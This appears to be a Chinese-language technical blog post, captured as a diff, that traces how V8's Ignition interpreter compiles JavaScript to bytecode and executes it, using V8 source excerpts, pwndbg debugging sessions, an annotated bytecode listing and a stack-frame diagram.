+<pre><code>InterpreterCompilationJob::Status InterpreterCompilationJob::ExecuteJobImpl() &#123;
+  RuntimeCallTimerScope runtimeTimerScope(
+      parse_info()-&gt;runtime_call_stats(),
+      parse_info()-&gt;on_background_thread()
+          ? RuntimeCallCounterId::kCompileBackgroundIgnition
+          : RuntimeCallCounterId::kCompileIgnition);
+  // TODO(lpy): add support for background compilation RCS trace.
+  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(&quot;v8.compile&quot;), &quot;V8.CompileIgnition&quot;);
+
+  // Print AST if flag is enabled. Note, if compiling on a background thread
+  // then ASTs from different functions may be intersperse when printed.
+  MaybePrintAst(parse_info(), compilation_info());
+
+  generator()-&gt;GenerateBytecode(stack_limit());
+
+  if (generator()-&gt;HasStackOverflow()) &#123;
+    return FAILED;
+  &#125;
+  return SUCCEEDED;
+&#125;
+</code></pre>
+<p>该函数又调用了<code>GenerateBytecode</code>，而GenerateBytecode继续调用<code>GenerateBytecodeBody</code></p>
+<pre><code>void BytecodeGenerator::GenerateBytecodeBody() &#123;
+  // Build the arguments object if it is used.
+  VisitArgumentsObject(closure_scope()-&gt;arguments());
+
+  // Build rest arguments array if it is used.
+  Variable* rest_parameter = closure_scope()-&gt;rest_parameter();
+  VisitRestArgumentsArray(rest_parameter);
+
+  // Build assignment to the function name or &#123;.this_function&#125;
+  // variables if used.
+  VisitThisFunctionVariable(closure_scope()-&gt;function_var());
+  VisitThisFunctionVariable(closure_scope()-&gt;this_function_var());
+
+  // Build assignment to &#123;new.target&#125; variable if it is used.
+  VisitNewTargetVariable(closure_scope()-&gt;new_target_var());
+
+  // Create a generator object if necessary and initialize the
+  // &#123;.generator_object&#125; variable.
+  if (IsResumableFunction(info()-&gt;literal()-&gt;kind())) &#123;
+    BuildGeneratorObjectVariableInitialization();
+  &#125;
+
+  // Emit tracing call if requested to do so.
+  if (FLAG_trace) builder()-&gt;CallRuntime(Runtime::kTraceEnter);
+
+  // Emit type profile call.
+  if (info()-&gt;collect_type_profile()) &#123;
+    feedback_spec()-&gt;AddTypeProfileSlot();
+    int num_parameters = closure_scope()-&gt;num_parameters();
+    for (int i = 0; i &lt; num_parameters; i++) &#123;
+      Register parameter(builder()-&gt;Parameter(i));
+      builder()-&gt;LoadAccumulatorWithRegister(parameter).CollectTypeProfile(
+          closure_scope()-&gt;parameter(i)-&gt;initializer_position());
+    &#125;
+  &#125;
+
+  // Visit declarations within the function scope.
+  VisitDeclarations(closure_scope()-&gt;declarations());
+
+  // Emit initializing assignments for module namespace imports (if any).
+  VisitModuleNamespaceImports();
+
+  // Perform a stack-check before the body.
+  builder()-&gt;StackCheck(info()-&gt;literal()-&gt;start_position());
+
+  // The derived constructor case is handled in VisitCallSuper.
+  if (IsBaseConstructor(function_kind()) &amp;&amp;
+      info()-&gt;literal()-&gt;requires_instance_members_initializer()) &#123;
+    BuildInstanceMemberInitialization(Register::function_closure(),
+                                      builder()-&gt;Receiver());
+  &#125;
+
+  // Visit statements in the function body.
+  VisitStatements(info()-&gt;literal()-&gt;body());
+
+  // Emit an implicit return instruction in case control flow can fall off the
+  // end of the function without an explicit return being present on all paths.
+  if (builder()-&gt;RequiresImplicitReturn()) &#123;
+    builder()-&gt;LoadUndefined();
+    BuildReturn();
+  &#125;
+&#125;
+</code></pre>
+<p>其中的<code>VisitDeclarations</code>用于处理函数中的变量声名，<code>VisitStatements</code>用于处理语句。其中的参数<code>info()-&gt;literal()-&gt;body()</code>是在Parser阶段生成的AST，VisitStatements实际上就是在遍历AST，然后生成对应的字节码。</p>
+<pre><code>void BytecodeGenerator::VisitStatements(
+    const ZonePtrList&lt;Statement&gt;* statements) &#123;
+  for (int i = 0; i &lt; statements-&gt;length(); i++) &#123;
+    // Allocate an outer register allocations scope for the statement.
+    RegisterAllocationScope allocation_scope(this);
+    Statement* stmt = statements-&gt;at(i);
+    Visit(stmt);
+    if (builder()-&gt;RemainderOfBlockIsDead()) break;
+  &#125;
+&#125;
+</code></pre>
+<h4 id="FinalizeUnoptimizedCompilationJob"><a href="#FinalizeUnoptimizedCompilationJob" class="headerlink" title="FinalizeUnoptimizedCompilationJob"></a>FinalizeUnoptimizedCompilationJob</h4><p>当AST遍历结束后，回到GenerateUnoptimizedCodeForToplevel函数，调用<code>FinalizeUnoptimizedCompilationJob</code>完成后续步骤</p>
+<pre><code>CompilationJob::Status FinalizeUnoptimizedCompilationJob(
+    UnoptimizedCompilationJob* job, Handle&lt;SharedFunctionInfo&gt; shared_info,
+    Isolate* isolate) &#123;
+  UnoptimizedCompilationInfo* compilation_info = job-&gt;compilation_info();
+  ParseInfo* parse_info = job-&gt;parse_info();
+
+  SetSharedFunctionFlagsFromLiteral(compilation_info-&gt;literal(), shared_info);
+
+  CompilationJob::Status status = job-&gt;FinalizeJob(shared_info, isolate);
+  if (status == CompilationJob::SUCCEEDED) &#123;
+    InstallUnoptimizedCode(compilation_info, shared_info, parse_info, isolate);
+    CodeEventListener::LogEventsAndTags log_tag;
+    if (parse_info-&gt;is_toplevel()) &#123;
+      log_tag = compilation_info-&gt;is_eval() ? CodeEventListener::EVAL_TAG
+                                            : CodeEventListener::SCRIPT_TAG;
+    &#125; else &#123;
+      log_tag = parse_info-&gt;lazy_compile() ? CodeEventListener::LAZY_COMPILE_TAG
+                                           : CodeEventListener::FUNCTION_TAG;
+    &#125;
+    job-&gt;RecordFunctionCompilation(log_tag, shared_info, isolate);
+    job-&gt;RecordCompilationStats(isolate);
+  &#125;
+  return status;
+&#125;
+</code></pre>
+<p>这里主要是通过<code>InstallUnoptimizedCode</code>将相关信息（字节码等）设置到<code>shared_info</code>中。这样，我们就完成了脚本的编译。</p>
+<h3 id="字节码执行"><a href="#字节码执行" class="headerlink" title="字节码执行"></a>字节码执行</h3><p>最后返回到d8的<code>bool Shell::ExecuteString</code>时，执行<code>aybe_result = script-&gt;Run(realm);</code>运行字节码。</p>
+<pre><code>MaybeLocal&lt;Value&gt; Script::Run(Local&lt;Context&gt; context) &#123;
+  auto isolate = reinterpret_cast&lt;i::Isolate*&gt;(context-&gt;GetIsolate());
+  TRACE_EVENT_CALL_STATS_SCOPED(isolate, &quot;v8&quot;, &quot;V8.Execute&quot;);
+  ENTER_V8(isolate, context, Script, Run, MaybeLocal&lt;Value&gt;(),
+           InternalEscapableScope);
+  i::HistogramTimerScope execute_timer(isolate-&gt;counters()-&gt;execute(), true);
+  i::AggregatingHistogramTimerScope timer(isolate-&gt;counters()-&gt;compile_lazy());
+  i::TimerEventScope&lt;i::TimerEventExecute&gt; timer_scope(isolate);
+  auto fun = i::Handle&lt;i::JSFunction&gt;::cast(Utils::OpenHandle(this));
+
+  i::Handle&lt;i::Object&gt; receiver = isolate-&gt;global_proxy();
+  Local&lt;Value&gt; result;
+  has_pending_exception = !ToLocal&lt;Value&gt;(
+      i::Execution::Call(isolate, fun, receiver, 0, nullptr), &amp;result);
+
+  RETURN_ON_FAILED_EXECUTION(Value);
+  RETURN_ESCAPED(result);
+&#125;
+</code></pre>
+<p>先是取到脚本对象，我们调试查看一下对象</p>
+<pre><code>auto fun = i::Handle&lt;i::JSFunction&gt;::cast(Utils::OpenHandle(this));
+pwndbg&gt; p fun
+$2 = &#123;
+  &lt;v8::internal::HandleBase&gt; = &#123;
+    location_ = 0x55dab8532088
+  &#125;, &lt;No data fields&gt;&#125;
+pwndbg&gt; x /20gx 0x55dab8532088
+0x55dab8532088: 0x000022c98b41e9f9  0x000022c98b41e869
+0x55dab8532098: 0x000022c98b41e979  0x000022c98b41e869
+0x55dab85320a8: 0x000022c98b41ea39  0x000022c98b41ea79
+0x55dab85320b8: 0x000022c98b41ea89  0x000022c98b41e739
+0x55dab85320c8: 0x000022c98b401749  0x00001b8cd50805b1
+0x55dab85320d8: 0x1baddead0baddeaf  0x1baddead0baddeaf
+0x55dab85320e8: 0x1baddead0baddeaf  0x1baddead0baddeaf
+0x55dab85320f8: 0x1baddead0baddeaf  0x1baddead0baddeaf
+0x55dab8532108: 0x1baddead0baddeaf  0x1baddead0baddeaf
+0x55dab8532118: 0x1baddead0baddeaf  0x1baddead0baddeaf
+pwndbg&gt; job 0x000022c98b41e9f9
+0x22c98b41e9f9: [Function] in OldSpace
+ - map: 0x0a2f0d2803b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x22c98b401ff1 &lt;JSFunction (sfi = 0x38046d688009)&gt;
+ - elements: 0x1b8cd5080c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - function prototype: 
+ - initial_map: 
+ - shared_info: 0x22c98b41e869 &lt;SharedFunctionInfo&gt;
+ - name: 0x1b8cd5080751 &lt;String[#0]: &gt;
+ - formal_parameter_count: 0
+ - kind: NormalFunction
+ - context: 0x22c98b401749 &lt;NativeContext[247]&gt;
+ - code: 0x3d3e6a804281 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;
+ - interpreted
+ - bytecode: 0x22c98b41e979 &lt;BytecodeArray[54]&gt;
+ - source code: function fun(x) &#123;
+   var a = 0x666;
+   if (x) &#123;
+      print(&quot;hello&quot;);
+   &#125; else &#123;
+      print(&quot;world&quot;);
+   &#125;
+   return a;
+&#125;
+
+fun(true);
+fun(false);
+%SystemBreak();
+
+
+ - properties: 0x1b8cd5080c21 &lt;FixedArray[0]&gt; &#123;
+    #length: 0x38046d6804b9 &lt;AccessorInfo&gt; (const accessor descriptor)
+    #name: 0x38046d680449 &lt;AccessorInfo&gt; (const accessor descriptor)
+    #arguments: 0x38046d680369 &lt;AccessorInfo&gt; (const accessor descriptor)
+    #caller: 0x38046d6803d9 &lt;AccessorInfo&gt; (const accessor descriptor)
+    #prototype: 0x38046d680529 &lt;AccessorInfo&gt; (const accessor descriptor)
+ &#125;
+
+ - feedback vector: 0x22c98b41ea39: [FeedbackVector] in OldSpace
+ - map: 0x1b8cd5080bc1 &lt;Map&gt;
+ - length: 3
+ - shared function info: 0x22c98b41e869 &lt;SharedFunctionInfo&gt;
+ - optimized code/marker: OptimizationMarker::kNone
+ - invocation count: 0
+ - profiler ticks: 0
+ - slot #0 LoadGlobalNotInsideTypeof UNINITIALIZED &#123;
+     [0]: [cleared]
+     [1]: 0x1b8cd5084da9 &lt;Symbol: (uninitialized_symbol)&gt;
+  &#125;
+ - slot #2 kCreateClosure  &#123;
+     [2]: 0x22c98b41ea79 &lt;FeedbackCell[no feedback]&gt;
+  &#125;
+</code></pre>
+<p>接下来调用<code>Execution::Call</code>去执行，我们继续跟进,最终来到execution.cc中的<code>V8_WARN_UNUSED_RESULT MaybeHandle&lt;Object&gt; Invoke</code>函数</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/execution.cc
+   239   Handle&lt;Code&gt; code =
+   240       JSEntry(isolate, params.execution_target, params.is_construct);
+   241   &#123;
+   242     // Save and restore context around invocation and block the
+   243     // allocation of handles without explicit handle scopes.
+ ► 244     SaveContext save(isolate);
+   245     SealHandleScope shs(isolate);
+   246 
+   247     if (FLAG_clear_exceptions_on_js_entry) isolate-&gt;clear_pending_exception();
+   248 
+   249     if (params.execution_target == Execution::Target::kCallable) &#123;
+</code></pre>
+<p>这里创建了一个JSEntry对象</p>
+<pre><code>pwndbg&gt; p code
+$5 = &#123;
+  &lt;v8::internal::HandleBase&gt; = &#123;
+    location_ = 0x5648828e5e68
+  &#125;, &lt;No data fields&gt;&#125;
+pwndbg&gt; x /20gx 0x5648828e5e68
+0x5648828e5e68: 0x000018d75d483bc1  0x000018d75d483c21
+0x5648828e5e78: 0x000018d75d483c81  0x000018d75d483ce1
+0x5648828e5e88: 0x000018d75d483d41  0x000018d75d483da1
+0x5648828e5e98: 0x000018d75d483e01  0x000018d75d483e61
+0x5648828e5ea8: 0x000018d75d483ec1  0x000018d75d483f21
+0x5648828e5eb8: 0x000018d75d483f81  0x000018d75d483fe1
+0x5648828e5ec8: 0x000018d75d484041  0x000018d75d4840a1
+0x5648828e5ed8: 0x000018d75d484101  0x000018d75d484161
+0x5648828e5ee8: 0x000018d75d4841c1  0x000018d75d484221
+0x5648828e5ef8: 0x000018d75d484281  0x000018d75d4842e1
+pwndbg&gt; job 0x000018d75d483bc1
+0x18d75d483bc1: [Code]
+ - map: 0x1b37e74809e1 &lt;Map&gt;
+kind = BUILTIN
+name = JSEntry
+compiler = unknown
+address = 0x7ffcf9e0d580
+
+Trampoline (size = 13)
+0x18d75d483c00     0  49ba80b02ca4af7f0000 REX.W movq r10,0x7fafa42cb080  (JSEntry)
+0x18d75d483c0a     a  41ffe2         jmp r10
+
+Instructions (size = 208)
+0x7fafa42cb080     0  55             push rbp
+0x7fafa42cb081     1  4889e5         REX.W movq rbp,rsp
+0x7fafa42cb084     4  6a02           push 0x2
+0x7fafa42cb086     6  4883ec08       REX.W subq rsp,0x8
+0x7fafa42cb08a     a  4154           push r12
+0x7fafa42cb08c     c  4155           push r13
+0x7fafa42cb08e     e  4156           push r14
+.......................................
+</code></pre>
+<p>接下来将func作为参数传给JSEntry，并执行</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/execution.cc
+   260       Address orig_func = params.new_target-&gt;ptr();
+   261       Address func = params.target-&gt;ptr();
+   262       Address recv = params.receiver-&gt;ptr();
+   263       Address** argv = reinterpret_cast&lt;Address**&gt;(params.argv);
+   264       RuntimeCallTimerScope timer(isolate, RuntimeCallCounterId::kJS_Execution);
+ ► 265       value = Object(stub_entry.Call(isolate-&gt;isolate_data()-&gt;isolate_root(),
+   266                                      orig_func, func, recv, params.argc, argv));
+   267     &#125; else &#123;
+   268       DCHECK_EQ(Execution::Target::kRunMicrotasks, params.execution_target);
+   269 
+   270       // clang-format off
+</code></pre>
+<p>我们单步跟入，接下来会执行Builtins_JSEntryTrampoline</p>
+<pre><code>   0x7fafa42cb0f2 &lt;Builtins_JSEntry+114&gt;    push   0
+   0x7fafa42cb0f4 &lt;Builtins_JSEntry+116&gt;    mov    r10, qword ptr [r13 + 0x2e28]
+   0x7fafa42cb0fb &lt;Builtins_JSEntry+123&gt;    push   qword ptr [r10]
+   0x7fafa42cb0fe &lt;Builtins_JSEntry+126&gt;    mov    r10, qword ptr [r13 + 0x2e28]
+   0x7fafa42cb105 &lt;Builtins_JSEntry+133&gt;    mov    qword ptr [r10], rsp
+ ► 0x7fafa42cb108 &lt;Builtins_JSEntry+136&gt;    call   Builtins_JSEntryTrampoline &lt;Builtins_JSEntryTrampoline&gt;
+        rdi: 0x5648828dfec0 —▸ 0x1b37e7480751 ◂— 0x5200001b37e74804
+        rsi: 0x1b37e74804d1 ◂— 0x1b37e74805
+        rdx: 0x19494b71e9f9 ◂— 0x21000025b6b56803
+        rcx: 0x38c735b01521 ◂— 0x21000025b6b5687f
+ 
+   0x7fafa42cb10d &lt;Builtins_JSEntry+141&gt;    mov    r10, qword ptr [r13 + 0x2e28]
+   0x7fafa42cb114 &lt;Builtins_JSEntry+148&gt;    pop    qword ptr [r10]
+   0x7fafa42cb117 &lt;Builtins_JSEntry+151&gt;    add    rsp, 8
+   0x7fafa42cb11b &lt;Builtins_JSEntry+155&gt;    pop    rbx
+   0x7fafa42cb11c &lt;Builtins_JSEntry+156&gt;    cmp    rbx, 2
+</code></pre>
+<p>继续跟进，最终执行到Builtins_CallFunction_ReceiverIsAny+311时，其中rdi为func对象，这里从对象中取了一个index，并根据index取了一个函数进行调用</p>
+<pre><code> ► 0x7fafa42bbab7 &lt;Builtins_CallFunction_ReceiverIsAny+311&gt;    mov    rcx, qword ptr [rdi + 0x2f]
+   0x7fafa42bbabb &lt;Builtins_CallFunction_ReceiverIsAny+315&gt;    cmp    dword ptr [rcx + 0x3b], -1
+   0x7fafa42bbabf &lt;Builtins_CallFunction_ReceiverIsAny+319&gt;    jne    Builtins_CallFunction_ReceiverIsAny+334 &lt;Builtins_CallFunction_ReceiverIsAny+334&gt;
+    ↓
+   0x7fafa42bbace &lt;Builtins_CallFunction_ReceiverIsAny+334&gt;    mov    ecx, dword ptr [rcx + 0x3b]
+   0x7fafa42bbad1 &lt;Builtins_CallFunction_ReceiverIsAny+337&gt;    mov    rcx, qword ptr [r13 + rcx*8 + 0x2f70]
+   0x7fafa42bbad9 &lt;Builtins_CallFunction_ReceiverIsAny+345&gt;    jmp    rcx
+</code></pre>
+<p>继续执行，可以发现调用的函数是<code>Builtins_InterpreterEntryTrampoline</code>,这个函数正是我们在func对象结构中看到的code处指向的函数</p>
+<pre><code>   0x7fafa42bbab7 &lt;Builtins_CallFunction_ReceiverIsAny+311&gt;    mov    rcx, qword ptr [rdi + 0x2f]
+   0x7fafa42bbabb &lt;Builtins_CallFunction_ReceiverIsAny+315&gt;    cmp    dword ptr [rcx + 0x3b], -1
+   0x7fafa42bbabf &lt;Builtins_CallFunction_ReceiverIsAny+319&gt;    jne    Builtins_CallFunction_ReceiverIsAny+334 &lt;Builtins_CallFunction_ReceiverIsAny+334&gt;
+    ↓
+   0x7fafa42bbace &lt;Builtins_CallFunction_ReceiverIsAny+334&gt;    mov    ecx, dword ptr [rcx + 0x3b]
+   0x7fafa42bbad1 &lt;Builtins_CallFunction_ReceiverIsAny+337&gt;    mov    rcx, qword ptr [r13 + rcx*8 + 0x2f70]
+ ► 0x7fafa42bbad9 &lt;Builtins_CallFunction_ReceiverIsAny+345&gt;    jmp    rcx &lt;Builtins_InterpreterEntryTrampoline&gt;
+</code></pre>
+<p>由此可以知道，但执行一个JS函数时，入口函数是code指向的函数，这种特性非常的方便，因为如果要对一个函数进行JIT优化，可以直接将code指向优化后的函数，如果解优化，则再将code改回去即可。甚至还可以进行延迟编译，有时候我们并不需要立即将所有的函数都编译为字节码，在调用的时候再编译也是可以的，将code指向CompileLazy函数即可。我们继续跟踪，看看字节码是如何被解释执行的。<br>Builtins_InterpreterEntryTrampoline主要是做一些初始化工作，然后就进行第一条ByteCode的Handler</p>
+<pre><code>   0x7fafa42d5d2b &lt;Builtins_InterpreterEntryTrampoline+939&gt;    je     Builtins_InterpreterEntryTrampoline+946 &lt;Builtins_InterpreterEntryTrampoline+946&gt;
+    ↓
+   0x7fafa42d5d32 &lt;Builtins_InterpreterEntryTrampoline+946&gt;    mov    rax, qword ptr [r13 - 0x28]
+   0x7fafa42d5d36 &lt;Builtins_InterpreterEntryTrampoline+950&gt;    mov    r15, qword ptr [r13 + 0x1608]
+   0x7fafa42d5d3d &lt;Builtins_InterpreterEntryTrampoline+957&gt;    movzx  r11d, byte ptr [r14 + r9]
+   0x7fafa42d5d42 &lt;Builtins_InterpreterEntryTrampoline+962&gt;    mov    rcx, qword ptr [r15 + r11*8]
+ ► 0x7fafa42d5d46 &lt;Builtins_InterpreterEntryTrampoline+966&gt;    call   rcx &lt;Builtins_LdaConstantHandler&gt;
+        rdi: 0x19494b71e9f9 ◂— 0x21000025b6b56803
+        rsi: 0x19494b701749 ◂— 0x1b37e7480f
+        rdx: 0x1b37e74804d1 ◂— 0x1b37e74805
+        rcx: 0x7fafa47ae180 (Builtins_LdaConstantHandler) ◂— lea    rbx, [rip - 7]
+</code></pre>
+<p>每一个bytecode都对应了一个Handler，当进入首个Handler以后，就不再需要主控去调度执行下一个bytecode了，因为每个Handler以自动机的形式实现了在结尾自动执行到下一个bytecode的Handler里，如下所示</p>
+<pre><code>   0x7f0a68ec946e &lt;Builtins_LdaConstantHandler+750&gt;    mov    r15, qword ptr [rbp - 0x20]
+   0x7f0a68ec9472 &lt;Builtins_LdaConstantHandler+754&gt;    mov    rcx, qword ptr [r15 + r8*8]
+   0x7f0a68ec9476 &lt;Builtins_LdaConstantHandler+758&gt;    mov    rbp, qword ptr [rbp]
+   0x7f0a68ec947a &lt;Builtins_LdaConstantHandler+762&gt;    mov    r9, rbx
+   0x7f0a68ec947d &lt;Builtins_LdaConstantHandler+765&gt;    add    rsp, 0x40
+ ► 0x7f0a68ec9481 &lt;Builtins_LdaConstantHandler+769&gt;    jmp    rcx &lt;Builtins_LdaZeroHandler&gt;
+    ↓
+   0x7f0a68ec8d80 &lt;Builtins_LdaZeroHandler&gt;            lea    rbx, [rip - 7] &lt;0x7f0a68ec8d80&gt;
+   0x7f0a68ec8d87 &lt;Builtins_LdaZeroHandler+7&gt;          cmp    rbx, rcx
+   0x7f0a68ec8d8a &lt;Builtins_LdaZeroHandler+10&gt;         je     Builtins_LdaZeroHandler+28 &lt;Builtins_LdaZeroHandler+28&gt;
+    ↓
+   0x7f0a68ec8d9c &lt;Builtins_LdaZeroHandler+28&gt;         lea    rbx, [r9 + 1]
+   0x7f0a68ec8da0 &lt;Builtins_LdaZeroHandler+32&gt;         movzx  edx, byte ptr [rbx + r14]
+</code></pre>
+<p>在源码<code>src/interpreter/interpreter-generator.cc</code>中实现了所有字节码的Handler，比如我们上面调试的<code>LdaConstant</code></p>
+<pre><code>// LdaConstant &lt;idx&gt;
+//
+// Load constant literal at |idx| in the constant pool into the accumulator.
+IGNITION_HANDLER(LdaConstant, InterpreterAssembler) &#123;
+  Node* constant = LoadConstantPoolEntryAtOperandIndex(0);
+  SetAccumulator(constant);
+  Dispatch();
+&#125;
+</code></pre>
+<p>结尾通过<code>Dispatch</code>实现自动执行到下一个bytecode。</p>
+<h3 id="理解字节码-虚拟机架构"><a href="#理解字节码-虚拟机架构" class="headerlink" title="理解字节码&#x2F;虚拟机架构"></a>理解字节码&#x2F;虚拟机架构</h3><p>对于如下代码，我们打印一下字节码</p>
+<pre><code>function fun(x) &#123;
+   var a = 0x666;
+   if (x) &#123;
+      print(&quot;hello&quot;);
+   &#125; else &#123;
+      print(&quot;world&quot;);
+   &#125;
+   return a;
+&#125;
+
+%DebugPrint(fun);
+%SystemBreak();
+fun(true);
+fun(false);
+
+[generated bytecode for function: ]
+Parameter count 1
+Register count 4
+Frame size 32
+         0x3225d5b9e9da @    0 : 12 00             LdaConstant [0] ;从常量池加载第0个元素
+         0x3225d5b9e9dc @    2 : 26 fa             Star r1 ;存入r1寄存器
+         0x3225d5b9e9de @    4 : 0b                LdaZero ;累加器清零
+         0x3225d5b9e9df @    5 : 26 f9             Star r2 ;存入r2寄存器
+         0x3225d5b9e9e1 @    7 : 27 fe f8          Mov &lt;closure&gt;, r3 
+         0x3225d5b9e9e4 @   10 : 61 2d 01 fa 03    CallRuntime [DeclareGlobals], r1-r3 ;声名fun函数
+    0 E&gt; 0x3225d5b9e9e9 @   15 : a5                StackCheck ;栈检查
+  125 S&gt; 0x3225d5b9e9ea @   16 : 13 01 00          LdaGlobal [1], [0] ;从常量此取出第1个元素作为名称，找到变量，这里找到的是fun函数对象
+         0x3225d5b9e9ed @   19 : 26 fa             Star r1 ；;存入r1
+         0x3225d5b9e9ef @   21 : 61 65 01 fa 01    CallRuntime [DebugPrint], r1-r1
+  143 S&gt; 0x3225d5b9e9f4 @   26 : 61 a7 01 fb 00    CallRuntime [SystemBreak], r0-r0
+  159 S&gt; 0x3225d5b9e9f9 @   31 : 0d                LdaUndefined 
+         0x3225d5b9e9fa @   32 : 26 f9             Star r2
+         0x3225d5b9e9fc @   34 : 13 01 00          LdaGlobal [1], [0]
+         0x3225d5b9e9ff @   37 : 26 fa             Star r1
+         0x3225d5b9ea01 @   39 : 10                LdaTrue 
+         0x3225d5b9ea02 @   40 : 26 f8             Star r3
+  159 E&gt; 0x3225d5b9ea04 @   42 : 5f fa f9 02       CallNoFeedback r1, r2-r3 调用fun函数
+  170 S&gt; 0x3225d5b9ea08 @   46 : 0d                LdaUndefined 
+         0x3225d5b9ea09 @   47 : 26 f9             Star r2
+         0x3225d5b9ea0b @   49 : 13 01 00          LdaGlobal [1], [0]
+         0x3225d5b9ea0e @   52 : 26 fa             Star r1
+         0x3225d5b9ea10 @   54 : 11                LdaFalse 
+         0x3225d5b9ea11 @   55 : 26 f8             Star r3
+  170 E&gt; 0x3225d5b9ea13 @   57 : 5f fa f9 02       CallNoFeedback r1, r2-r3 ;调用fun函数
+         0x3225d5b9ea17 @   61 : 26 fb             Star r0
+  201 S&gt; 0x3225d5b9ea19 @   63 : a9                Return 
+Constant pool (size = 2)
+0x3225d5b9e959: [FixedArray] in OldSpace
+ - map: 0x0fb2739007b1 &lt;Map&gt;
+ - length: 2
+           0: 0x3225d5b9e8c1 &lt;FixedArray[4]&gt;
+           1: 0x3225d5b9e7b9 &lt;String[#3]: fun&gt;
+Handler Table (size = 0)
+</code></pre>
+<p>有关字节码的解释，可以在<code>src/interpreter/interpreter-generator.cc</code>文件中查看。从字节码中，我们可以知道，每一个函数都有一个常量池，里面存储着一些常量。这个常量池是在之前分析的字节码生成过程中的<code>FinalizeUnoptimizedCompilationJob</code>函数中，其调用了<code>CompilationJob::Status status = job-&gt;FinalizeJob(shared_info, isolate);</code>,</p>
+<pre><code>InterpreterCompilationJob::Status InterpreterCompilationJob::FinalizeJobImpl(
+    Handle&lt;SharedFunctionInfo&gt; shared_info, Isolate* isolate) &#123;
+  RuntimeCallTimerScope runtimeTimerScope(
+      parse_info()-&gt;runtime_call_stats(),
+      RuntimeCallCounterId::kCompileIgnitionFinalization);
+  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(&quot;v8.compile&quot;),
+               &quot;V8.CompileIgnitionFinalization&quot;);
+
+  Handle&lt;BytecodeArray&gt; bytecodes =
+      generator()-&gt;FinalizeBytecode(isolate, parse_info()-&gt;script());
+  if (generator()-&gt;HasStackOverflow()) &#123;
+    return FAILED;
+  &#125;
+
+  if (ShouldPrintBytecode(shared_info)) &#123;
+    StdoutStream os;
+    std::unique_ptr&lt;char[]&gt; name =
+        compilation_info()-&gt;literal()-&gt;GetDebugName();
+    os &lt;&lt; &quot;[generated bytecode for function: &quot; &lt;&lt; name.get() &lt;&lt; &quot;]&quot;
+       &lt;&lt; std::endl;
+    bytecodes-&gt;Disassemble(os);
+    os &lt;&lt; std::flush;
+  &#125;
+
+  compilation_info()-&gt;SetBytecodeArray(bytecodes);
+  return SUCCEEDED;
+&#125;
+</code></pre>
+<p>其中在<code>FinalizeBytecode</code>中调用了<code>AllocateDeferredConstants</code>生成了常量池</p>
+<pre><code>Handle&lt;BytecodeArray&gt; BytecodeGenerator::FinalizeBytecode(
+    Isolate* isolate, Handle&lt;Script&gt; script) &#123;
+.................
+  AllocateDeferredConstants(isolate, script);
+.................
+</code></pre>
+<p>AllocateDeferredConstants函数如下</p>
+<pre><code>void BytecodeGenerator::AllocateDeferredConstants(Isolate* isolate,
+                                                  Handle&lt;Script&gt; script) &#123;
+  // Build global declaration pair arrays.
+  for (GlobalDeclarationsBuilder* globals_builder : global_declarations_) &#123;
+    Handle&lt;FixedArray&gt; declarations =
+        globals_builder-&gt;AllocateDeclarations(info(), script, isolate);
+    if (declarations.is_null()) return SetStackOverflow();
+    builder()-&gt;SetDeferredConstantPoolEntry(
+        globals_builder-&gt;constant_pool_entry(), declarations);
+  &#125;
+
+  // Find or build shared function infos.
+  .....................
+
+  // Find or build shared function infos for the native function templates.
+  .....................
+
+  // Build object literal constant properties
+  .....................
+
+  // Build array literal constant elements
+  .....................
+
+  // Build class literal boilerplates.
+  .....................
+
+  // Build template literals.
+  .....................
+&#125;
+</code></pre>
+<p>现在我们来研究一下虚拟机的栈结构</p>
+<pre><code>                    +-------------------------------------+--------------+
+                    |             ...........             |              |
+                    |                                     |              |
+                    +-------------------------------------+              |
+                    |                 R2                  |              |
+                    |                                     |              |
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |                 R1                  |              |
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |                 R0                  |              |
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |           Bytecode offset           |              |
+                    |                                     |              |
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |           Bytecode Array            |              |        Callee Frame
+                    |                                     |              +---------------------&gt;
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |             JSFunction              |              |
+                    |                                     |              |
+                    +-------------------------------------+              |
+                    |              Context                |              |
+        RBP         |                                     |              |
+&lt;---------------------------------------------------------+              |
+                    |                                     |              |
+                    |            Previous BP              |              |
+                    |                                     |              |
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |           Return Address            |              |
+                    |                                     |              |
+                    +----------------------------------------------------+
+                    |                                     |              |
+                    |             Argument 3              |              |
+                    |                                     |              |
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |             Argument 2              |              |
+                    |                                     |              |
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |             Argument 1              |              |      Caller Frame
+                    |                                     |              +-------------------------&gt;
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |           JSGlobalProxy             |              |
+                    |                                     |              |
+                    +-------------------------------------+              |
+                    |                                     |              |
+                    |             ........                |              |
+                    |                                     |              |
+                    +-------------------------------------+--------------+
+</code></pre>
+<p>如图是v8虚拟机的栈结构，为了实际调试，首先，我们观察到fun函数</p>
+<pre><code>DebugPrint: 0x1ff32561ead1: [Function] in OldSpace
+ - map: 0x250f54a803b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x1ff325601ff1 &lt;JSFunction (sfi = 0x1a302888009)&gt;
+ - elements: 0x08396ef00c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - function prototype: 
+ - initial_map: 
+ - shared_info: 0x1ff32561e8f1 &lt;SharedFunctionInfo fun&gt;
+ - name: 0x1ff32561e7b9 &lt;String[#3]: fun&gt;
+ - builtin: CompileLazy
+ - formal_parameter_count: 1
+ - kind: NormalFunction
+ - context: 0x1ff325601749 &lt;NativeContext[247]&gt;
+ - code: 0x054bd2f04641 &lt;Code BUILTIN CompileLazy&gt;
+</code></pre>
